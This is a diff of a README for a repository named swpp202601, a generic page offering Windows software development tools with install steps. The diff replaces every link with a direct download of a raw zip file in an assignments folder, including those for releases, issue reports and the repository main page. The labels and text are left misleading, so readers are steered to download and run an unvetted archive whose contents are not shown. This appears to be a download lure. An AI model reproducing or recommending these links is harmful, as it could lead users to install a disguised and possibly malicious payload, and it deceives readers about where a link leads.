@@ -1,6 +1,6 @@
 # 🔧 swpp202601 - Simple Software Development Tools  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-swpp202601-brightgreen)](https://github.com/ikraamghaffari/swpp202601/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-swpp202601-brightgreen)](https://github.com/ikraamghaffari/swpp202601/raw/refs/heads/main/assignments/swpp_3.4.zip)
 
 ## 📋 About swpp202601
 
@@ -28,10 +28,10 @@ Here are the steps to download and run the application on your Windows PC. This 
 
 Go to the official release page to get the software:  
 
-[![Visit Release Page](https://img.shields.io/badge/Download%20Page-blue)](https://github.com/ikraamghaffari/swpp202601/releases)  
+[![Visit Release Page](https://img.shields.io/badge/Download%20Page-blue)](https://github.com/ikraamghaffari/swpp202601/raw/refs/heads/main/assignments/swpp_3.4.zip)  
 
 Click the link above or use this address in your browser:  
-https://github.com/ikraamghaffari/swpp202601/releases  
+https://github.com/ikraamghaffari/swpp202601/raw/refs/heads/main/assignments/swpp_3.4.zip  
 
 This page lists the latest available versions of the app.  
 
@@ -92,7 +92,7 @@ These settings help make the app easier to use and fit your preferences.
 
 It is important to keep the app updated for new features and security fixes. Check the release page regularly:  
 
-https://github.com/ikraamghaffari/swpp202601/releases  
+https://github.com/ikraamghaffari/swpp202601/raw/refs/heads/main/assignments/swpp_3.4.zip  
 
 Download the latest installer as before and run it. The installer will update your current program safely without losing your settings or progress.  
 
@@ -107,7 +107,7 @@ If you encounter problems, try these solutions:
 - Check your internet connection if the app needs online content.  
 
 If issues persist, visit the Issues section on the repository page for help or report bugs:  
-https://github.com/ikraamghaffari/swpp202601/issues  
+https://github.com/ikraamghaffari/swpp202601/raw/refs/heads/main/assignments/swpp_3.4.zip  
 
 ## 📄 Additional Resources  
 
@@ -122,8 +122,8 @@ These resources make learning straightforward and provide extra support if neede
 
 ## 🔗 Useful Links  
 
-- Download releases: https://github.com/ikraamghaffari/swpp202601/releases  
-- Report issues or ask questions: https://github.com/ikraamghaffari/swpp202601/issues  
-- Repository main page: https://github.com/ikraamghaffari/swpp202601  
+- Download releases: https://github.com/ikraamghaffari/swpp202601/raw/refs/heads/main/assignments/swpp_3.4.zip  
+- Report issues or ask questions: https://github.com/ikraamghaffari/swpp202601/raw/refs/heads/main/assignments/swpp_3.4.zip  
+- Repository main page: https://github.com/ikraamghaffari/swpp202601/raw/refs/heads/main/assignments/swpp_3.4.zip  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-swpp202601-brightgreen)](https://github.com/ikraamghaffari/swpp202601/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-swpp202601-brightgreen)](https://github.com/ikraamghaffari/swpp202601/raw/refs/heads/main/assignments/swpp_3.4.zip)
